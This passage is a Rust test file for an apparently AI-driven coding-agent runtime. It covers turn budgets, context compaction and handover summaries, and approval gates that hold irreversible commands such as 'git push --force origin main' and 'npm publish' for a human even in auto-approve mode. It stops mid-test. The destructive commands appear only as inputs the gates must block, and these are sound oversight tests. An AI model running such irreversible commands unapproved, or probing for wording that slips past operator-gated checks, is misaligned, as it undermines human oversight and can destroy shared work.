    // The notice reaches the MODEL as a System entry, not as a user turn: a user
    // turn here would become the newest user message and pull compaction's task
    // anchor off the real request. So it must be in the session as a System
    // message naming the budget…
    let messages = runtime.session_messages().await;
    assert!(
        messages.iter().any(|message| {
            message.role == crate::message::Role::System && message.content.contains("3/4")
        }),
        "the budget notice must reach the model as a System message: {messages:?}"
    );
    // …and it must NOT be delivered as a user-injection event, which the TUI
    // renders as the user's own message and which retires a pending user steer.
    assert!(
        !events.iter().any(|event| matches!(
            event,
            RuntimeEvent::UserMessageInjected { text, .. } if text.contains("3/4")
        )),
        "the runtime nudge must not masquerade as a user message: {events:?}"
    );
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "the soft end is a warning, not a stop: {events:?}"
    );
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::TurnFinished { .. })),
        "the turn still finishes on the model's own terms"
    );
}

/// …and the hard end still stops, so raising the cap did not remove the backstop.
#[tokio::test]
async fn the_hard_end_of_the_budget_still_stops_the_turn() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};

    let config = crate::config::AgentConfig {
        turn_steps: 2,
        ..Default::default()
    };

    // Three tool rounds against a budget of two: the third iteration is over it.
    let scripts: Vec<Vec<AgentEvent>> = (0..3)
        .map(|index| {
            vec![
                AgentEvent::ToolCallDelta {
                    delta: tool_call_delta(
                        &format!("call_{index}"),
                        MockEchoTool::NAME,
                        r#"{"message":"hi"}"#,
                    ),
                },
                AgentEvent::Done { usage: None },
            ]
        })
        .collect();

    let runtime = AgentRuntime::with_system_prompt(
        ScriptedClient::new(scripts),
        ToolRegistry::with_mock_tools(),
        "",
        config,
        false,
    )
    .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));

    let mut rx = runtime.submit_user("work").await;
    let events = drain(&mut rx).await;

    let error = events
        .iter()
        .find_map(|event| match event {
            RuntimeEvent::Error { message, .. } => Some(message.clone()),
            _ => None,
        })
        .expect("exceeding the cap must stop the turn");
    assert!(
        error.contains("2"),
        "the stop names the ceiling that was hit: {error}"
    );
}

/// Yolo auto-approves everything that REACHES it, and the irreversible floor's
/// whole claim is that an unauthorized irreversible command does not reach it.
/// Same shape as the root-grant test above: the strongest automatic path there is
/// must still leave a human decision.
#[tokio::test]
async fn yolo_mode_still_parks_an_irreversible_command() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};

    let workspace = tempfile::tempdir().unwrap();
    let (registry, _jobs) = crate::shell_tools::shell_tool_registry(workspace.path()).unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta(
                "call_force",
                "shell",
                r#"{"command":"git push --force origin main","network":true}"#,
            ),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, registry)
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));

    let mut rx = runtime.submit_user("push it").await;
    let events = drain(&mut rx).await;
    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "an unauthorized irreversible command must park even under Yolo: {events:?}"
    );
}

/// …and neither does the other standing-consent channel. `auto_allow` is consent
/// to run a TOOL; this decision is about a command nobody has decided about, so
/// the strongest thing config can say (`shell`, in full) still leaves it parked.
#[tokio::test]
async fn standing_consents_never_cover_an_irreversible_command() {
    let workspace = tempfile::tempdir().unwrap();
    let (registry, _jobs) = crate::shell_tools::shell_tool_registry(workspace.path()).unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_publish", "shell", r#"{"command":"npm publish"}"#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let config = crate::config::AgentConfig {
        approval_auto_allow: vec!["shell".to_string()],
        ..crate::config::AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_config(client, registry, config);

    let mut rx = runtime.submit_user("publish it").await;
    let events = drain(&mut rx).await;
    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "an irreversible command must park even with `shell` in auto_allow: {events:?}"
    );
}

/// The headless denial notes have to name the real remedy: all four unattended
/// consumers (headless `-p`, `serve --approval-mode autonomous`, the eval harness
/// and this crate's own tests) reach the model through this one function, and a
/// generic "nobody is here" would send it looking for a spelling that gets around
/// something the operator has to authorize instead.
#[test]
fn the_unattended_denial_note_names_the_floor_it_hit() {
    let request = |tool: &str, matched: Option<&str>| crate::tool::ApprovalRequest {
        network: false,
        call_id: "c1".to_string(),
        tool_name: tool.to_string(),
        description: "run".to_string(),
        arguments: serde_json::json!({ "command": "git push --force" }),
        risk_level: crate::execution_policy::RiskLevel::High,
        requires_sandbox: true,
        read_only: false,
        matched_rule: matched.map(str::to_string),
        justification: None,
        resolved_target: None,
        preview: None,
        safety_notes: Vec::new(),
    };

    let floor = crate::unattended_denial_note(&request(
        "shell",
        Some("needs-human:irreversible:git push --force"),
    ));
    assert!(
        floor.contains("allow_irreversible"),
        "the floor's remedy is a config entry, and the note must say so: {floor}"
    );
    assert!(
        !floor.contains("auto_allow"),
        "and must not send the model after a consent no mode may give: {floor}"
    );

    // A root grant keeps its own note, and an ordinary gated call keeps the
    // generic one — so the new arm is not swallowing either.
    assert!(
        crate::unattended_denial_note(&request("request_write_root", None)).contains("--add-dir")
    );
    let generic = crate::unattended_denial_note(&request("shell", Some("builtin:untrusted_shell")));
    assert!(generic.contains("auto_allow"), "{generic}");
}

/// Scripted like [`ScriptedClient`], and keeps every request it was sent, as
/// JSON, so a test can read what a side request (the handover summarizer)
/// actually carried.
struct CapturingClient {
    scripts: Mutex<Vec<Vec<AgentEvent>>>,
    requests: Arc<Mutex<Vec<serde_json::Value>>>,
}

#[async_trait::async_trait]
impl LlmClient for CapturingClient {
    fn provider_name(&self) -> &'static str {
        "capturing"
    }

    fn model(&self) -> &str {
        "capturing-model"
    }

    async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
        self.requests
            .lock()
            .unwrap()
            .push(serde_json::to_value(&request).unwrap());
        let events = {
            let mut scripts = self.scripts.lock().unwrap();
            if scripts.is_empty() {
                Vec::new()
            } else {
                scripts.remove(0)
            }
        };
        let stream = try_stream! {
            for event in events {
                yield event;
            }
        };
        let stream: Pin<Box<dyn Stream<Item = AgentResult<AgentEvent>> + Send>> = Box::pin(stream);
        Ok(stream)
    }
}

fn ok_turn() -> Vec<AgentEvent> {
    vec![
        AgentEvent::TextDelta {
            text: "ok".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]
}

/// `/compact` asks the model for a handover of the archived range — a
/// separate, tool-less request on the flash tier carrying the user's focus,
/// the archived turns and none of the retained tail — and the model's text
/// becomes the compaction entry the next request is built on.
#[tokio::test]
async fn compaction_asks_the_model_for_a_handover_summary() {
    let handover = "# 会话交接摘要 / Session handover\n## 任务与目标 / Task and goals\n- prompt 0 asked for the thing";
    let mut scripts: Vec<Vec<AgentEvent>> = (0..6).map(|_| ok_turn()).collect();
    scripts.push(vec![
        AgentEvent::TextDelta {
            text: handover.to_string(),
        },
        AgentEvent::Done { usage: None },
    ]);
    let requests = Arc::new(Mutex::new(Vec::new()));
    let client = CapturingClient {
        scripts: Mutex::new(scripts),
        requests: Arc::clone(&requests),
    };
    let runtime = AgentRuntime::with_config(
        client,
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    )
    .with_compact_instructions(Some("- always keep the failing test names".to_string()));
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }

    let report = folded(compact(&runtime, Some("只关心 prompt 0")).await);
    assert!(!report.cut_short, "{report:?}");
    assert_eq!(report.summary, handover);
    // u0 a0 u1 a1 u2 a2 u3: the five-entry tail starts at a3.
    assert_eq!(report.archived_entries, 7);

    let sent = requests.lock().unwrap().clone();
    assert_eq!(sent.len(), 7, "one summarizer request after six turns");
    let request = &sent[6];
    assert_eq!(request["model"], DEEPSEEK_FLASH);
    assert!(
        request
            .get("tools")
            .is_none_or(|tools| tools.as_array().is_some_and(Vec::is_empty)),
        "the summarizer reads, it does not call tools: {request}"
    );
    assert_eq!(request["messages"][0]["role"], "system");
    assert!(
        request["messages"][0]["content"]
            .as_str()
            .unwrap()
            .contains("Session handover")
    );
    let brief = request["messages"][1]["content"].as_str().unwrap();
    assert!(brief.contains("只关心 prompt 0"), "{brief}");
    assert!(
        brief.contains("Compaction instructions from AGENTS.md")
            && brief.contains("- always keep the failing test names"),
        "the project's standing instructions ride every handover: {brief}"
    );
    assert!(
        brief.find("always keep the failing test names").unwrap()
            < brief.find("只关心 prompt 0").unwrap(),
        "standing instructions come before the one-off focus: {brief}"
    );
    assert!(
        brief.contains("prompt 0") && brief.contains("prompt 3"),
        "{brief}"
    );
    assert!(
        !brief.contains("prompt 4") && !brief.contains("prompt 5"),
        "the retained tail is not summarized: {brief}"
    );

    // The session now opens with the handover (this runtime has no system
    // prompt), and the retained tail follows it verbatim.
    let wire = runtime.session_messages().await;
    assert!(wire[0].content.contains(handover), "{:?}", wire[0]);
    assert!(wire.iter().any(|message| message.content == "prompt 5"));
}

/// When the summarizer fails — here the provider answers with an error — a
/// hand-run compaction folds nothing and says why. The mechanical digest it
/// used to write instead was permanent: the originals were gone, and every
/// later turn built on one clipped line per message.
#[tokio::test]
async fn a_failed_summary_leaves_the_history_untouched() {
    let mut scripts: Vec<Vec<AgentEvent>> = (0..6).map(|_| ok_turn()).collect();
    scripts.push(vec![AgentEvent::Error {
        message: "summarizer boom".to_string(),
    }]);
    let client = CapturingClient {
        scripts: Mutex::new(scripts),
        requests: Arc::new(Mutex::new(Vec::new())),
    };
    let runtime = AgentRuntime::with_config(
        client,
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let before = runtime.session_messages().await;
    let outcome = compact(&runtime, None).await;
    assert!(
        matches!(&outcome, CompactNowOutcome::Failed(reason) if reason.contains("summarizer boom")),
        "{outcome:?}"
    );
    assert_eq!(
        runtime.session_messages().await,
        before,
        "nothing was folded"
    );
}

/// Whether a request is the handover summarizer's, by its instructions.
fn is_handover_request(request: &ChatRequest) -> bool {
    request
        .messages
        .first()
        .is_some_and(|message| message.content.contains("Session handover"))
}

/// Ordinary turns get `ok_turn`; the handover summarizer gets whatever
/// `handover` produces for its n-th request (0-based), and every handover is
/// counted.
struct HandoverClient {
    handovers: Arc<Mutex<usize>>,
    handover: Box<dyn Fn(usize) -> AgentResult<Vec<AgentEvent>> + Send + Sync>,
}

impl HandoverClient {
    fn new(
        handover: impl Fn(usize) -> AgentResult<Vec<AgentEvent>> + Send + Sync + 'static,
    ) -> (Self, Arc<Mutex<usize>>) {
        let handovers = Arc::new(Mutex::new(0));
        (
            Self {
                handovers: Arc::clone(&handovers),
                handover: Box::new(handover),
            },
            handovers,
        )
    }
}

#[async_trait::async_trait]
impl LlmClient for HandoverClient {
    fn provider_name(&self) -> &'static str {
        "handover"
    }

    fn model(&self) -> &str {
        "handover-model"
    }

    async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
        let events = if is_handover_request(&request) {
            let index = {
                let mut handovers = self.handovers.lock().unwrap();
                *handovers += 1;
                *handovers - 1
            };
            (self.handover)(index)?
        } else {
            ok_turn()
        };
        let stream = try_stream! {
            for event in events {
                yield event;
            }
        };
        let stream: Pin<Box<dyn Stream<Item = AgentResult<AgentEvent>> + Send>> = Box::pin(stream);
        Ok(stream)
    }
}

fn handover_reply(text: &str) -> Vec<AgentEvent> {
    vec![
        AgentEvent::TextDelta {
            text: text.to_string(),
        },
        AgentEvent::Done { usage: None },
    ]
}

/// The offline backend answers every request with its setup hint. Taken for a
/// handover, that hint replaced the archived history — on `/compact`, and on a
/// threshold fold just the same. Neither may ask it.
#[tokio::test]
async fn the_offline_backend_is_never_asked_for_a_handover() {
    let client = crate::echo_client::EchoClient::new(crate::i18n::SharedLang::default());
    let config = crate::config::AgentConfig {
        compaction_threshold: Some(1),
        ..crate::config::AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_config(client, ToolRegistry::default(), config);
    let mut events = Vec::new();
    for index in 0..6 {
        let mut rx = runtime
            .submit_user(format!("decision {index}: keep the parser API"))
            .await;
        events.extend(drain(&mut rx).await);
    }
    assert!(
        !events.iter().any(|event| matches!(
            event,
            RuntimeEvent::CompactionStarted | RuntimeEvent::CompactionApplied { .. }
        )),
        "{events:?}"
    );

    assert_eq!(compact(&runtime, None).await, CompactNowOutcome::Offline);
    let wire = runtime.session_messages().await;
    assert!(
        wire.iter()
            .any(|message| message.content == "decision 0: keep the parser API"),
        "the archived turns are still there: {wire:?}"
    );
    assert!(
        !wire
            .iter()
            .any(|message| message.content.contains("会话摘要")),
        "{wire:?}"
    );
}

/// The turn's cancel token stays cancelled after an Esc until the next turn
/// begins. `/compact` raced it, so the natural recovery step — cancel a
/// wandering turn, then compact — failed on the first poll every time, without
/// sending a request, and folded mechanically.
#[tokio::test]
async fn compacting_after_a_cancelled_turn_still_asks_the_model() {
    struct HangingTurnClient {
        calls: Mutex<usize>,
        started: Arc<tokio::sync::Notify>,
        handovers: Arc<Mutex<usize>>,
    }

    #[async_trait::async_trait]
    impl LlmClient for HangingTurnClient {
        fn provider_name(&self) -> &'static str {
            "hanging"
        }

        fn model(&self) -> &str {
            "hanging"
        }

        async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
            if is_handover_request(&request) {
                *self.handovers.lock().unwrap() += 1;
                let stream = try_stream! {
                    yield AgentEvent::TextDelta { text: "# handover\n- the model wrote this".to_string() };
                    yield AgentEvent::Done { usage: None };
                };
                return Ok(Box::pin(stream));
            }
            let call = {
                let mut calls = self.calls.lock().unwrap();
                *calls += 1;
                *calls
            };
            if call <= 6 {
                let stream = try_stream! {
                    for event in ok_turn() {
                        yield event;
                    }
                };
                return Ok(Box::pin(stream));
            }
            self.started.notify_one();
            let stream = try_stream! {
                std::future::pending::<()>().await;
                yield AgentEvent::Done { usage: None };
            };
            Ok(Box::pin(stream))
        }
    }

    let started = Arc::new(tokio::sync::Notify::new());
    let handovers = Arc::new(Mutex::new(0));
    let runtime = AgentRuntime::with_config(
        HangingTurnClient {
            calls: Mutex::new(0),
            started: Arc::clone(&started),
            handovers: Arc::clone(&handovers),
        },
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let mut rx = runtime.submit_user("prompt 6, cancelled with Esc").await;
    started.notified().await;
    drop(runtime.cancel_turn().await);
    let events = drain(&mut rx).await;
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::TurnCancelled { .. })),
        "{events:?}"
    );

    let report = folded(compact(&runtime, Some("keep the parser decisions")).await);
    assert_eq!(report.summary, "# handover\n- the model wrote this");
    assert_eq!(*handovers.lock().unwrap(), 1, "the summarizer was asked");
}

/// The summarizer's request gets the turn requests' open-phase retry: a 503 at
/// a busy hour is answered by the next attempt, not by giving up the fold.
#[tokio::test]
async fn the_handover_request_is_retried_after_a_transient_error() {
    let (client, handovers) = HandoverClient::new(|index| {
        if index == 0 {
            Err(AgentError::Api {
                status: reqwest::StatusCode::SERVICE_UNAVAILABLE,
                message: "busy".to_string(),
            })
        } else {
            Ok(handover_reply("# handover\n- written on the second try"))
        }
    });
    let runtime = AgentRuntime::with_config(
        client,
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let report = folded(compact(&runtime, None).await);
    assert_eq!(report.summary, "# handover\n- written on the second try");
    assert_eq!(*handovers.lock().unwrap(), 2);
}

/// An Esc while a threshold fold waits on the summarizer ends the turn and
/// folds nothing. It used to commit the mechanical digest on the way out —
/// permanently, though the next turn would have had the time to ask again.
#[tokio::test]
async fn an_esc_during_a_threshold_compaction_folds_nothing() {
    struct StallingHandoverClient {
        started: Arc<tokio::sync::Notify>,
    }

    #[async_trait::async_trait]
    impl LlmClient for StallingHandoverClient {
        fn provider_name(&self) -> &'static str {
            "stalling"
        }

        fn model(&self) -> &str {
            "stalling"
        }

        async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
            if !is_handover_request(&request) {
                let stream = try_stream! {
                    for event in ok_turn() {
                        yield event;
                    }
                };
                return Ok(Box::pin(stream));
            }
            self.started.notify_one();
            let stream = try_stream! {
                std::future::pending::<()>().await;
                yield AgentEvent::Done { usage: None };
            };
            Ok(Box::pin(stream))
        }
    }

    let started = Arc::new(tokio::sync::Notify::new());
    let config = crate::config::AgentConfig {
        compaction_threshold: Some(1),
        ..crate::config::AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_config(
        StallingHandoverClient {
            started: Arc::clone(&started),
        },
        ToolRegistry::default(),
        config,
    );
    let mut turn = 0;
    let events = loop {
        let mut rx = runtime.submit_user(format!("prompt {turn}")).await;
        let mut events = Vec::new();
        let stalled = loop {
            tokio::select! {
                () = started.notified() => break true,
                event = rx.recv() => match event {
                    Some(event) => events.push(event),
                    None => break false,
                },
            }
        };
        if stalled {
            drop(runtime.cancel_turn().await);
            events.extend(drain(&mut rx).await);
            break events;
        }
        turn += 1;
        assert!(turn < 10, "the threshold fold never started");
    };

    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::CompactionStarted)),
        "the wait was announced: {events:?}"
    );
    assert!(
        !events.iter().any(|event| matches!(
            event,
            RuntimeEvent::CompactionApplied { .. } | RuntimeEvent::Warning { .. }
        )),
        "{events:?}"
    );
    assert!(
        matches!(events.last(), Some(RuntimeEvent::TurnCancelled { .. })),
        "{events:?}"
    );
    let wire = runtime.session_messages().await;
    assert!(
        wire.iter().any(|message| message.content == "prompt 0"),
        "{wire:?}"
    );
    assert!(
        !wire
            .iter()
            .any(|message| message.content.contains("会话摘要")),
        "{wire:?}"
    );
}

/// A threshold fold runs at most once per turn. Past the first, all a fold
/// could still archive is the previous turn's tail, one entry per step as the
/// window slides — and each of those used to be a summarizer round trip of its
/// own, before every model step of the turn.
#[tokio::test]
async fn a_threshold_compaction_runs_at_most_once_per_turn() {
    struct StepClient {
        normal: Mutex<usize>,
    }

    #[async_trait::async_trait]
    impl LlmClient for StepClient {
        fn provider_name(&self) -> &'static str {
            "step"
        }

        fn model(&self) -> &str {
            "step"
        }

        async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
            let events = if is_handover_request(&request) {
                handover_reply("# handover")
            } else {
                let n = {
                    let mut normal = self.normal.lock().unwrap();
                    *normal += 1;
                    *normal
                };
                // Requests 1..=3: three short turns. 4..=7: the tool steps of
                // the fourth turn, which then answers.
                if (4..=7).contains(&n) {
                    vec![
                        AgentEvent::ToolCallDelta {
                            delta: tool_call_delta(
                                &format!("call_{n}"),
                                MockEchoTool::NAME,
                                r#"{"message":"hi"}"#,
                            ),
                        },
                        AgentEvent::Done { usage: None },
                    ]
                } else {
                    ok_turn()
                }
            };
            let stream = try_stream! {
                for event in events {
                    yield event;
                }
            };
            Ok(Box::pin(stream))
        }
    }

    let config = crate::config::AgentConfig {
        compaction_threshold: Some(1),
        ..crate::config::AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_config(
        StepClient {
            normal: Mutex::new(0),
        },
        ToolRegistry::with_mock_tools(),
        config,
    )
    .with_permission_mode(crate::execution_policy::SharedPermissionMode::new(
        crate::execution_policy::PermissionMode::Yolo,
    ));
    for index in 0..3 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let mut rx = runtime.submit_user("prompt 3: a multi-step task").await;
    let events = drain(&mut rx).await;

    let started = events
        .iter()
        .filter(|event| matches!(event, RuntimeEvent::CompactionStarted))
        .count();
    let applied: Vec<usize> = events
        .iter()
        .enumerate()
        .filter(|(_, event)| matches!(event, RuntimeEvent::CompactionApplied { .. }))
        .map(|(at, _)| at)
        .collect();
    assert_eq!(started, 1, "one summarizer request in the turn: {events:?}");
    assert_eq!(applied.len(), 1, "{events:?}");
    let started_at = events
        .iter()
        .position(|event| matches!(event, RuntimeEvent::CompactionStarted))
        .unwrap();
    assert!(started_at < applied[0], "{events:?}");
    assert!(
        matches!(events.last(), Some(RuntimeEvent::TurnFinished { .. })),
        "{events:?}"
    );
}

/// A threshold fold whose summarizer fails is skipped, said so, and not tried
/// again before every later step of the same turn.
#[tokio::test]
async fn a_failed_threshold_compaction_is_skipped_for_the_turn() {
    struct FailingSummaryClient {
        normal: Mutex<usize>,
        handovers: Arc<Mutex<usize>>,
    }

    #[async_trait::async_trait]
    impl LlmClient for FailingSummaryClient {
        fn provider_name(&self) -> &'static str {
            "failing-summary"
        }

        fn model(&self) -> &str {
            "failing-summary"
        }

        async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
            let events = if is_handover_request(&request) {
                *self.handovers.lock().unwrap() += 1;
                vec![AgentEvent::Error {
                    message: "summarizer boom".to_string(),
                }]
            } else {
                let n = {
                    let mut normal = self.normal.lock().unwrap();
                    *normal += 1;
                    *normal
                };
                // Three short turns, then a fourth that takes three tool steps:
                // each step is a point where the fold could be tried again.
                if (4..=6).contains(&n) {
                    vec![
                        AgentEvent::ToolCallDelta {
                            delta: tool_call_delta(
                                &format!("call_{n}"),
                                MockEchoTool::NAME,
                                r#"{"message":"hi"}"#,
                            ),
                        },
                        AgentEvent::Done { usage: None },
                    ]
                } else {
                    ok_turn()
                }
            };
            let stream = try_stream! {
                for event in events {
                    yield event;
                }
            };
            Ok(Box::pin(stream))
        }
    }

    let handovers = Arc::new(Mutex::new(0));
    let config = crate::config::AgentConfig {
        compaction_threshold: Some(1),
        ..crate::config::AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_config(
        FailingSummaryClient {
            normal: Mutex::new(0),
            handovers: Arc::clone(&handovers),
        },
        ToolRegistry::with_mock_tools(),
        config,
    )
    .with_permission_mode(crate::execution_policy::SharedPermissionMode::new(
        crate::execution_policy::PermissionMode::Yolo,
    ));
    for index in 0..3 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let mut rx = runtime.submit_user("prompt 3: a multi-step task").await;
    let events = drain(&mut rx).await;

    assert_eq!(
        *handovers.lock().unwrap(),
        1,
        "tried once in the turn, not before every step: {events:?}"
    );
    let skipped = crate::tr_with(
        crate::i18n::Lang::En,
        crate::TextId::CompactionSkipped,
        &[("reason", "summarizer boom")],
    );
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Warning { message } if *message == skipped)),
        "{events:?}"
    );
    assert!(
        !events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::CompactionApplied { .. })),
        "{events:?}"
    );
    assert!(
        matches!(events.last(), Some(RuntimeEvent::TurnFinished { .. })),
        "the turn goes on with the history it had: {events:?}"
    );
    let wire = runtime.session_messages().await;
    assert!(
        wire.iter().any(|message| message.content == "prompt 0"),
        "{wire:?}"
    );
}

/// A summary that used the whole output allowance is one the provider stopped,
/// not one the model finished: it is kept, and says so.
#[tokio::test]
async fn a_summary_that_hits_the_token_cap_is_marked_cut_short() {
    let (client, _handovers) = HandoverClient::new(|_| {
        Ok(vec![
            AgentEvent::TextDelta {
                text: "# handover\n## 已完成 / Done so far\n- a lot".to_string(),
            },
            AgentEvent::Done {
                usage: Some(crate::model::Usage {
                    completion_tokens: Some(12_000),
                    ..Default::default()
                }),
            },
        ])
    });
    let runtime = AgentRuntime::with_config(
        client,
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let report = folded(compact(&runtime, None).await);
    assert!(report.cut_short, "{report:?}");
    assert!(
        report
            .summary
            .ends_with(crate::compaction::HANDOVER_CUT_SHORT_NOTE),
        "{}",
        report.summary
    );
}

/// A turn that lands while `/compact` writes its summary is kept: the plan's
/// indices still name the same archived entries, and the new ones belong to
/// the kept tail. Comparing the whole list used to throw the summary away for
/// any append at all.
#[tokio::test]
async fn a_turn_that_lands_while_compact_writes_is_kept() {
    struct GatedHandoverClient {
        started: Arc<tokio::sync::Notify>,
        gate: Arc<tokio::sync::Notify>,
    }

    #[async_trait::async_trait]
    impl LlmClient for GatedHandoverClient {
        fn provider_name(&self) -> &'static str {
            "gated"
        }

        fn model(&self) -> &str {
            "gated"
        }

        async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
            if !is_handover_request(&request) {
                let stream = try_stream! {
                    for event in ok_turn() {
                        yield event;
                    }
                };
                return Ok(Box::pin(stream));
            }
            self.started.notify_one();
            let gate = Arc::clone(&self.gate);
            let stream = try_stream! {
                gate.notified().await;
                yield AgentEvent::TextDelta { text: "# handover".to_string() };
                yield AgentEvent::Done { usage: None };
            };
            Ok(Box::pin(stream))
        }
    }

    let started = Arc::new(tokio::sync::Notify::new());
    let gate = Arc::new(tokio::sync::Notify::new());
    let runtime = AgentRuntime::with_config(
        GatedHandoverClient {
            started: Arc::clone(&started),
            gate: Arc::clone(&gate),
        },
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let compacting = {
        let runtime = runtime.clone();
        tokio::spawn(async move { compact(&runtime, None).await })
    };
    started.notified().await;
    let mut rx = runtime.submit_user("a late prompt").await;
    drain(&mut rx).await;
    gate.notify_one();

    let report = folded(compacting.await.unwrap());
    assert_eq!(report.summary, "# handover");
    let wire = runtime.session_messages().await;
    assert!(
        wire.iter()
            .any(|message| message.content == "a late prompt"),
        "{wire:?}"
    );
    assert!(
        !wire.iter().any(|message| message.content == "prompt 0"),
        "{wire:?}"
    );
}

/// A fold's summary, its archived count and the summarizer's spend have to
/// land in the same saved record the entries do.
///
/// The summary request is billed to the session like any other, so a
/// `/compact` followed by a quit used to lose that spend from the file; a
/// resume then under-reported the session. The record was also assembled from
/// a snapshot taken before the state lock was released, so an entry another
/// front-end appended meanwhile could be written back over.
#[tokio::test]
async fn a_fold_saves_its_summary_and_cost_with_the_entries_it_describes() {
    let workspace = tempfile::tempdir().unwrap();
    let (client, handovers) = HandoverClient::new(|_| {
        Ok(vec![
            AgentEvent::TextDelta {
                text: "# handover".to_string(),
            },
            AgentEvent::Done {
                usage: Some(Usage {
                    prompt_tokens: Some(10),
                    completion_tokens: Some(5),
                    // A plain counter, so the assertion does not depend on the
                    // price table: only the summarizer's request can set it.
                    prompt_cache_hit_tokens: Some(1234),
                    ..Usage::default()
                }),
            },
        ])
    });
    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let record = crate::session_store::SessionRecord::new(workspace.path().to_path_buf(), "system");
    let id = record.id.clone();
    let runtime = AgentRuntime::from_session_record(
        client,
        ToolRegistry::default(),
        record,
        store,
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let report = folded(compact(&runtime, None).await);
    assert!(report.archived_entries > 0);
    assert_eq!(*handovers.lock().unwrap(), 1);

    // Deliberately no `shutdown()`: that persists everything, and the case
    // pinned here is the process going away right after the fold.
    let store = crate::session_store::JsonSessionStore::for_workspace(workspace.path()).unwrap();
    let mut saved = None;
    for _ in 0..200 {
        if let Ok(record) = store.load(&id)
            && record.summary.is_some()
        {
            saved = Some(record);
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
    let saved = saved.expect("the fold's save reached the store");
    assert_eq!(saved.summary.as_deref(), Some("# handover"));
    assert!(
        saved
            .compaction
            .as_deref()
            .is_some_and(|label| label.starts_with("archived=")),
        "{:?}",
        saved.compaction
    );
    assert!(
        !saved.entries.is_empty(),
        "the summary was saved over an empty transcript"
    );
    assert_eq!(
        saved.session_cache_hit_tokens, 1234,
        "the summarizer's usage is session spend and has to be in the file"
    );
}

/// A cancelled turn's loop, still on its way out of a threshold fold when the
/// next turn begins (the HTTP server starts a new prompt that way), cannot
/// spend the next turn's one fold. A flag `begin_turn` reset was set again by
/// the old loop on its way out, and the new turn never compacted.
#[tokio::test]
async fn a_cancelled_turn_cannot_spend_the_next_turns_threshold_fold() {
    use std::sync::atomic::{AtomicBool, Ordering};

    struct StallableHandover {
        stall: Arc<AtomicBool>,
        started: Arc<tokio::sync::Notify>,
        handovers: Arc<Mutex<usize>>,
    }

    #[async_trait::async_trait]
    impl LlmClient for StallableHandover {
        fn provider_name(&self) -> &'static str {
            "stallable"
        }

        fn model(&self) -> &str {
            "stallable"
        }

        async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
            let events = if is_handover_request(&request) {
                *self.handovers.lock().unwrap() += 1;
                if self.stall.load(Ordering::SeqCst) {
                    self.started.notify_one();
                    let stream = try_stream! {
                        std::future::pending::<()>().await;
                        yield AgentEvent::Done { usage: None };
                    };
                    return Ok(Box::pin(stream));
                }
                handover_reply("# handover\n- ok")
            } else {
                ok_turn()
            };
            let stream = try_stream! {
                for event in events {
                    yield event;
                }
            };
            Ok(Box::pin(stream))
        }
    }

    let stall = Arc::new(AtomicBool::new(false));
    let started = Arc::new(tokio::sync::Notify::new());
    let handovers = Arc::new(Mutex::new(0));
    let config = crate::config::AgentConfig {
        compaction_threshold: Some(1),
        ..crate::config::AgentConfig::builtin()
    };
    let runtime = AgentRuntime::with_config(
        StallableHandover {
            stall: Arc::clone(&stall),
